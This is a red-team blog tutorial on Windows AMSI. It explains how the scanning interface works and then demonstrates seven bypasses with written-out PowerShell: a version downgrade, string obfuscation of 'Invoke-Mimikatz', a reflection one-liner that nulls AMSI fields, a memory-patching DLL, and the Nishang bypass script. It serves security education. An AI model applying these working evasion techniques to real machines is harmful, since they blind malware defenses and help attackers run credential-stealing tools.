@@ -1,0 +1,138 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
+            <h1 class="post-title entry-title">A Detailed Guide on AMSI Bypass</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/" rel="bookmark"><time class="entry-date published" datetime="2022-04-11T20:27:32+00:00">April 11, 2022</time><time class="updated" datetime="2025-06-23T18:56:55+00:00">June 23, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Windows developed the Antimalware Scan Interface (AMSI) standard that allows a developer to integrate malware defense in his application. AMSI allows an application to interact with any anti-virus installed on the system and prevent dynamic, script-based malwares from executing. We’ll learn more about AMSI, implementation in code and some of the well-known bypasses in this article.</span></p>
+<h3><span style="color: #800000;">Table of content</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Background</strong></span></li>
+<li><span style="color: #000000;"><strong>Malware naming convention</strong></span></li>
+<li><span style="color: #000000;"><strong>How AMSI works</strong></span></li>
+<li><span style="color: #000000;"><strong>AMSI Bypass methods:</strong></span>
+<ul>
+<li><span style="color: #000000;"><strong>Method 1: Powershell downgrade</strong></span></li>
+<li><span style="color: #000000;"><strong>Method 2: Obfuscation</strong></span></li>
+<li><span style="color: #000000;"><strong>Method 3: Forcing an error</strong></span></li>
+<li><span style="color: #000000;"><strong>Method 4: Memory Hijacking</strong></span></li>
+<li><span style="color: #000000;"><strong>Method 5: Memory Hijacking (obfuscated opcodes)</strong></span></li>
+<li><span style="color: #000000;"><strong>Method 6: AMSI bypass by reflection</strong></span></li>
+<li><span style="color: #000000;"><strong>Method 7: Nishang All in One script</strong></span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Conclusion</strong></span></li>
+</ul>
+<h3><span style="color: #800000;">Background</span></h3>
+<p><span style="color: #000000;">In one sentence, Microsoft provides a script-based malware scanning API that developers can integrate into any application to scan and detect the integrity of user input in order to safeguard the application and thus, consumers against malwares. For example, a messenger app may scan messages with AMSI for malware before sending it forward to the receiver.</span></p>
+<p><span style="color: #000000;">AMSI is vendor-independent and provides open Win32 API and COM interfaces for the developer to use. Since Microsoft manages AMSI itself, the latest malware signatures are auto-updated in it. Hence, a developer can integrate AMSI quite easily to protect its consumers from dynamic, script-based malwares. You can read the developer guide <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/windows/win32/amsi/dev-audience">here</a></strong></span>.</span></p>
+<p><span style="color: #000000;">AMSI works on signature-based detection. This means that for every particular malicious keyword, URL, function or procedure, AMSI has a related signature in its database. So, if an attacker uses that same keyword in his code again, AMSI blocks the execution then and there.</span></p>
+<h3><span style="color: #800000;">Malware naming convention</span></h3>
+<p><span style="color: #000000;">Before reading more about the working of AMSI, let’s understand how malwares are named. Often in analysis, Windows detects malware but analysts are unable to identify the exact details and behaviour of the malware. Computer Antivirus Research Organisation (CARO) has given a standard naming convention for malware. For example, a shortcut based caphaw backdoor is named like:</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgVcWnH5FeQEqvmC29TQb_Y5p4HoukQ6kg9n0rFPRQQRs9bY744FIV3T3rJsHuNF5awNCLvuSPUruZpQRz4ATVc1OMEXZR66OVi6cZ6QsvdwWMgGy8LwLBqPmK4fBNyfXmkmpjepSFxwyBPMsknWhE2F5IiRJZIoQ9BTSn4SDEmQsx5fRSNycRjWZvCpA/s16000/0.png"/></span></p>
+<p><span style="color: #000000;">Read more about malware <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/malware/understanding-malware?view=o365-worldwide">here</a></strong></span>.</span></p>
+<h3><span style="color: #800000;">How AMSI works</span></h3>
+<p><span style="color: #000000;">As a developer, you can use AMSI to provide malware defense using AMSI. Let’s say you create an application that inputs a script and executes it using a scripting engine like Powershell. At the point when input is being taken, AMSI can be called in to check for malware first. Windows provides COM and Win32 APIs to call AMSI. The workflow of AMSI is as follows:</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhK04zHRArW2xEe2hBlsIL61s2_HTCNZ1zkIdWJseU9v1xL9wOrznbH3ZPQDtSRSPVLvhVnNB1pSZXMr6izoh2wetWhvCGhzV2pnbZIAzzhEQ2kZCVStITIAeH4wbFJSk2XhnnYfox6ONiRREtnK8vqQdCX5c-MSLOmjH_30yr7hvLHlYsFVByUVy_QoQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000;"><strong>Explanation: </strong>As you can see, the AMSI API is open, so any AV can read the data from its functions. Here, a windows script is being run. When it is passed through AMSI, amsi.dll is injected in the same virtual memory as that of our program. This amsi.dll has various functions that can evaluate code. These functions can be found <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-functions">here</a></strong></span>. However, the actual scanning task is conducted by these two functions:</span></p>
+<ul>
+<li><span style="color: #000000;">AmsiScanString()</span></li>
+<li><span style="color: #000000;">AmsiScanBuffer()</span></li>
+</ul>
+<p><span style="color: #000000;">These functions evaluate the code. If the code is clean, the AV provider class finally receives the results and sends them to the AV service using an RPC call. If the code is suspicious, the AMSI itself blocks it.</span></p>
+<h3><span style="color: #800000;">AMSI Bypass methods</span></h3>
+<p><span style="color: #000000;">Now that we have discussed the basics of AMSI, we will be discussing some of the very well-known techniques to bypass AMSI. Bypassing AMSI is often necessary for red-teamers in order to execute arbitrary code for lateral movement/privilege escalation.</span></p>
+<p><span style="color: #000000;">To cover all of the bypass methods extend beyond the scope of this article as there are new methods coming in each day. This document discusses the prominent ones and tests them on Windows 10 version 1809. We note that the latest versions of Windows (beyond 1903) block almost all of the methods available on the internet as they keep updating signatures.</span></p>
+<p><span style="color: #000000;"><strong>NOTE: </strong>AMSI blocks certain keywords like “invoke-mimikatz” or “amsiutils” since security experts widely know them to be used for exploitation, and so, as a proof of concept, we will only run these commands post bypass. Actual payloads won’t be bypassed here.</span></p>
+<p><span style="color: #000000;">Microsoft has integrated AMSI in the powershell terminal (powershell.exe application) which takes in input and parses it through the Powershell engine. If we open process hacker and search for amsi.dll, we will see that the powershell terminal is running amsi, and it will first scan any input.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjKCgy0qzws_J17Y7uxUY70mcRdJ7OKVSBojrF-nevRRra1NA4DY84plKwqOMEZHTAsNnCqux6Xq56Gpn3H2vHD7yZSAgc9ewRMqj96MHbCFRTXGdENcR698n9XgOWERK7xtV2t9MwtcNPW3zM3jqWAykADpjuHt0KKg9vZKr7YQjZ5Yk6EkZlM_GZaFA/s16000/2.png"/></span></p>
+<h4><span style="color: #800000;">Method 1: Powershell Downgrade</span></h4>
+<p><span style="color: #000000;">If you’re running a PowerShell-based payload and AMSI blocks it, you can downgrade your PowerShell version to 2.0 as AMSI only supports versions beyond v2.0. First, you can see that AMSI is blocking our keywords.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjK-yCaGGBt2Ywr4hCMWsyIkIeFbSeH-ShKqlnFDq4BrIItEQeBvU9jQ8BIM0tnVz0DlP-Yp_xk0rVVTqRVK6XrTnqK0cuUykmptec1pW-dTe1IpkqC_JIl-ilB-4MyJ2rreUBEzbIayRiWGeU7oomI8PWuVf17jkMmRR7K6rMpmC96YYUwyldebvWBcg/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">Let’s check the current version of PS and then downgrade to version 2 and run these blocked commands again.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">$PSVersionTable
+"amsiutils"
+powershell -version 2
+"amsiutils"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgHA_s6XQCsf7zguP-SlVRO0RouwqsNGMwyfXXbS4TJ65Y6S5JV3ONqFaX_EtSaJ6j6Jrz2Rwz8Lonn-1ArPMCvlV8KktbpyCftZ6mm2ZAVqooZqMcWHaBNjCu4GXVdjzJj05HvLzMCKnesaVM6StpIQlQz8-4aTz1BK97W4KIfpWTWIqGzeQPIQzDyFw/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">But as you would imagine, the biggest drawback here is that many modern functions or scripts won’t run on Powershell 2.0. So, let’s see some other methods.</span></p>
+<h4><span style="color: #800000;">Method 2: Obfuscation</span></h4>
+<p><span style="color: #000000;">Obfuscation refers to the trick of making your code complex and un-readable. AMSI detects signatures on the basis of certain keywords, and so, obfuscating these keywords works. For example, let’s obfuscate the invoke-mimikatz command</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Invoke-Mimikatz
+"Inv”+"o+"ke"+"-Mimi"+"katz"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgsxf8JumXzmhtctowt43YiZedvu3mC2ckOOBcfaLDWs-6HnqwrJ5Ede9HU6kb_ccoWMgWdUWirtV98lrjcQNxJHFvzPk5pGPpXqxakD5Vw0ngeYPulxdM3XeybGBg0JxYRhu30Hka4KWPccFIvLrud5fcJthk0kyTSivkqRDrU7jGeY8SZg0CheDM0ZQ/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">As you can see, simply by breaking a string and concatenating them using the + operator we were able to bypass AMSI.</span></p>
+<p><span style="color: #000000;">However, this technique has its own demerits. A payload may trigger AMSI one or more times. It is virtually very time consuming and noise creating to keep obfuscating keyword by keyword after each run of a payload. Hence, we follow <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/">this</a> </strong></span>manual obfuscation guide by @ShitSecure.</span></p>
+<p><span style="color: #000000;">RhytmStick developed this tool “AmsiTrigger” which can scan a script/payload against AMSI and tell us which lines exactly would trigger AMSI and then we can obfuscate them! You can download the tool <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/RythmStick/AMSITrigger">here</a></strong></span>.</span></p>
+<p><span style="color: #000000;">Now, we have created a script called demo.ps1 with the following commands</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEicxomg8UBZcQrhcNJ-yE0ihCLWEN5WmvFCXxI49Qs3N-vdWydFpvKuv4iLY3Ca10So4I7jhezilSWUIlyc8wXNqABBhxGFolB5V8FsH3GvlbbdmGyDX6wpFRxkdIo1x1k4I3EanlV0pKV_dpWy4y2gayRNFWstWPJ-0igVu4SegHfhFWQNMK2vusGJPQ/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">I want to check this against AMSI using AmsiTrigger. This can be done like:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">.\demo.ps1
+.\AmsiTrigger.ps1 -i .\demo.ps1</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhzy92xJG8OTKOTEmnUwjOXLb0Fvwm55j4OcKsjkS13bAuPWW0czTC2ilFG_ugA27gAOGCXCD25ffN-2tyVPzz_1TXr6hRmL5iLSWSPWa7NPQxALAi4jLYzWaUeU8e8SfVQRDynT_231n-cQ8F8m8g3BmeVYh-7A_sEsXlV9gRTqqbv8JMkJlaqYi4rwQ/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">Now, the tool has told me the lines where AMSI blocks execution. We can go ahead and obfuscate them using the string concatenation method like:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">"am"+"si"+"ut"+"ils"
+"in"+"vok"+"e"+"-"+"mi"+"mik"+"atz"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjJoWij3FKcMj7p0vHtXT-UGJhvCTlp0CRAH9_CGihlXnZhBqSrfFzupmXmS6XS9fUmhjuI6Nw5iJ98N_WFj8jYGJvy-o3x5ko7uBrof6ShTMv8qO1xuqN0Fa3ePu-FiZkVIeYlxGh4GZVUMu3B3tdLuhpT9sxqAKJ4kOX3cq27sAyl_px4q5QMJkkQqw/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">Now, they can be run and successfully bypass AMSI!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj3qHXGv0IllNxmRYWlNQPxHgxcmalYWj25cxoJJF0Gx_4psR3B9mhpwfAFmyQrGHmrq6sj7W6GDgmjECV8VsLIwmGAItaZaFN4Y-0SalxaspYQChn-vx00AsnPovKJBbFdxbZpR8ZpPDk1tg5g3_I15x2POKjSMdwD2BheJzll7H6GI66OiP1RqF1W0w/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">You can also try <span style="color: #0000ff;"><strong>https://amsi.fail </strong></span>to obfuscate your code.</span></p>
+<h4><span style="color: #800000;">Method 3: Forcing an error</span></h4>
+<p><span style="color: #000000;">Matt Graeber talked about a method to bypass AMSI in his tweet <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://twitter.com/mattifestation/status/735261120487772160">here</a></strong></span>. The function amsiInitFailed() throws 0 if the scenarios shown above initiate an AMSI scan. This bypass basically assigns amsiInitFailed a boolean True value so that AMSI initialization fails – no scan will occur at all for the current process! The code is:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
+
+[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhuG5mV6PnYS2ykdsqIhaXzUCZk_PpKJXRibOsFjj2yqoWOfkodX5ZxuECcnj6R9wWTKwYAYEy-NF9lLylEH904M2xtwSKz6SniAuABymRa5k5w8Ge4PdnaLgGK40n0A84HRbuUujYaW9FoDlg9yRYbGk6IQ6qQIt2YYnjfcRYJvi-K0KJcVSvxZV_SQQ/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">Ever since that time, many people have posted different variants of the same method. In some methods bytecode is used, in others, functions are replaced or strings are replaced but the logic prevails the same.</span></p>
+<h4><span style="color: #800000;">Method 4: Memory Hijacking</span></h4>
+<p><span style="color: #000000;">Daniel Duggan posted about memory hijacking techniques that can bypass AMSI in his blog <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://rastamouse.me/memory-patching-amsi-bypass/">here</a></strong></span>. The logic is to hook (read about hooking <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/android-hooking-and-sslpinning-using-objection-framework/">here</a></strong></span>) the function AmsiScanBuffer() so that it always returns the handle <strong>AMSI_RESULT_CLEAN </strong>indicating that AMSI has found no malware. The API responses could be monitored using the API monitor tool by Rohitab.</span></p>
+<p><span style="color: #000000;">First, let’s download the Invoke-Mimikatz script and see that AMSI is working properly.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEObcgN-Qq6t0Yt_e1ayWdvY1VY4RBgnPz6XKUjmnOig64Z9UUFGOMlJ1y752HqsflA8IUoUJQO2ZevuqyR9JMh128e5YZWQq-dRUqu-RvrSOVSKuClkH_LS1HPHgWTNF4YyVZ29rVyYDz2FIroL4sAkDb1LMb_ftWPEnfGIZ5k8XHQ-aNG27tHvPU9A/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">Now, the actual code is provided <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/rasta-mouse/AmsiScanBufferBypass">here</a></strong></span>. However, to reduce your hassle of compiling the code as DLL, you can check my fork <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/harshitrajpal/AmsiScanBufferBypass">here</a></strong></span>. After you download it, make sure you change the main package’s name from “AmsiScanBufferBypass” to “Project” or whatever you like as AMSI blocks the string “AmsiScanBufferBypass” too!</span></p>
+<p><span style="color: #000000;">After downloading, you go to the release folder and see the presence of a DLL called <strong>ASBBypass.dll</strong></span></p>
+<p><span style="color: #000000;">Please note that since we now have a DLL, we can integrate it with our EXE payload as well and it will bypass AMSI on the go!</span></p>
+<p><span style="color: #000000;">However, here, we will be using in-line C# code to activate the patch using the powershell terminal only! This can be done like:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">[System.Reflection.Assembly]::LoadFile("C:\users\hex\Project\ASBBypass.dll")
+[Amsi]::Bypass()</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjW1YWdvdLrZNnRJ-KCoXHwyjn4vZidhB2ND-8UzlusO-e0zMpNK-TAORCQPkuMD3uOJr1bUWd0EL0gcixpOfCSTvMFv-PYKdz5BFV2zUGogR5egm0-eaqebx3_PfRu9kYASH6_-EnitowOpuYWsrZqe8yzdXb3nmPHgl0yyBlHFclVUz6yEybji1bbZw/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">As you can see, amsi has now been bypassed!</span></p>
+<h4><span style="color: #800000;">Method 5: Memory Hijacking (obfuscated opcodes)</span></h4>
+<p><span style="color: #000000;">After detecting the Rasta Mouse (Daniel Duggan) technique, people made various changes in the code to make it FUD again. Fatrodzianko posted about one such technique in his blog <span style="color: #0000ff;"><strong>here</strong></span>. He obfuscated the same code using opcodes and put the script on gist <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://gist.github.com/FatRodzianko/c8a76537b5a87b850c7d158728717998#file-my-am-bypass-ps1">here</a></strong></span>.</span></p>
+<p><span style="color: #000000;">To run the script, just download it, rename it (to avoid keyword detection by AMSI) and run like:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">"invoke-mimikatz"
+.\my-am-bypass.ps1
+"invoke-mimikatz"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhA7Ng0eACK4CQuICxOt6dQxU2oFob2xmq3G54U3taLkx6Nn-SriNOWElCJGUDTxs14dpFdcH9uW9aQ0dLrbdePe-dbLA1aS6-JQNwc5Px7k49T0S49jlfeeUX9KjO3EHCNLUXxTJE-RLmtIZW_ZFLAsC9iUmYPLy3xNpOy678ZtviABPhiFPfqa1zHQA/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">As you can see, we have successfully bypassed AMSI now.</span></p>
+<h4><span style="color: #800000;">Method 6: AMSI bypass by reflection</span></h4>
+<p><span style="color: #000000;">According to Microsoft, “Reflection provides objects (of type Type) that describe assemblies, modules, and types. You can use reflection to dynamically create an instance of a type, bind the type to an existing object, or get the type from an existing object and invoke its methods or access its fields and properties. If you are using attributes in your code, reflection enables you to access them.” Read more <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/reflection">here</a></strong></span>.</span></p>
+<p><span style="color: #000000;">Paul Laine posted the original memory hijacking method on contextis.com blog <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.contextis.com/us/blog/amsi-bypass">here</a></strong></span>. Shantanu Khandelwal converted the same code to become full in-memory patch by using Matt Graeber’s reflection technique mentioned <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://twitter.com/mattifestation/status/735261176745988096?lang=en">here</a></strong></span>. Shantanu made the code stealthier as no on-disk artefact was left now. See his site <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.redteam.cafe/red-team/powershell/using-reflection-for-amsi-bypass">here</a></strong></span>.</span></p>
+<p><span style="color: #000000;">We won’t demonstrate the original patch but the reflection update is downloaded from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://gist.github.com/shantanu561993/6483e524dc225a188de04465c8512909">here</a></strong></span>. Ensure you download and rename the script and avoid using keywords like “amsibypass” etc since they get blocked. I have renamed it to “am-bp-reflection.ps1”</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">"invoke-mimikatz"
+.\am-bp-reflection.ps1
+"invoke-mimikatz"</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjtG_5bL--OFzp12MsQQzUsklWOHuM0eg9RcpB51VdK4U9HUk19ghtW1HZit-lOxJecdCSwoVPaCSe0lkLT1i0lB2Oe1u3VMsBREBM4Bszfoe7GWidrqIDZVDZ7rbvPchiyF2APjfih6rLvYPtr7U1Bsn4YCp-eUzozzyp077ZMLClU0mqkHhOf2Tl0Gw/s16000/14.png"/></strong></span></p>
+<h4><strong><span style="color: #800000;">Method 7: Nishang All in One script</span></strong></h4>
+<p><span style="color: #000000;">Nikhil Mittal added an AMSI bypass script in his well-known tool “Nishang,” which can be found <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/samratashok/nishang/blob/master/Bypass/Invoke-AmsiBypass.ps1">here</a></strong></span>. The script combines 6 different methods to bypass AMSI under one run. These are:</span></p>
+<ul>
+<li><span style="color: #000000;">unload – Method by Matt Graeber. Unloads AMSI from current PowerShell session.</span></li>
+<li><span style="color: #000000;">unload2 – Another method by Matt Graeber. Unloads AMSI from current PowerShell session.</span></li>
+<li><span style="color: #000000;">unloadsilent – Another method by Matt Graeber. Unloads AMSI and avoids WMF5 autologging.</span></li>
+<li><span style="color: #000000;">unloadobfuscated – ‘unload’ method above obfuscated with Daneil Bohannon’s Invoke-Obfuscation – which avoids WMF5 autologging.</span></li>
+<li><span style="color: #000000;">dllhijack – Method by Cornelis de Plaa. The amsi.dll used in the code is from p0wnedshell (https://github.com/Cn33liz/p0wnedShell)</span></li>
+<li><span style="color: #000000;">psv2 – If .net 2.0.50727 is available on Windows 10. PowerShell v2 is launched which doesn’t support AMSI.</span></li>
+</ul>
+<p><span style="color: #000000;">We just have to download the script and run and the tool automatically will bypass AMSI using a valid method. For example, here WMF5 autologging bypass has worked. This method unloads AMSI from the current terminal and bypasses it.</span></p>
+<p><span style="color: #000000;">Download the script from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/samratashok/nishang/blob/master/Bypass/Invoke-AmsiBypass.ps1">here</a> </strong></span>and rename it to “nishang.ps1” and run it like so:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Import-Module .\nishang.ps1
+Invoke-AmsiBypass -Verbose
+“invoke-mimikatz”</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgANKgHRkKzjJVUyf8oF7ICaDcN3cDPS86kn9TnMOR5A7ZALQL6e1CIdaMbTsZcNxMX0oCEWn62eHLUHvHGv-tSMfSL1RFNNLKCsuvetLiFSg_aYpbAomJnHLfkLMRTZaR7u6cmLa6dTbHWVLTOGHLFQjuoj47fwQnsfa9sgIqpkWVaKrHrPiAFJOZqrA/s16000/15.png"/></strong></span></p>
+<h3><span style="color: #800000;">Conclusion</span></h3>
+<p><span style="color: #000000;">In this article, we talked about the basics of AMSI, how to use them in a program, workflow and 7 ways to bypass them. Please note that more ways exist than shown here, but the article aims to discuss the most widely known 7 methods to bypass AMSI, how this AMSI evasion game has developed over time, and how complexity has only increased. Hope you liked the article. Thanks for reading.</span></p>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact</span><strong> <span style="color: #0000ff;"><a class="broken_link" style="color: #0000ff;" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></span></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
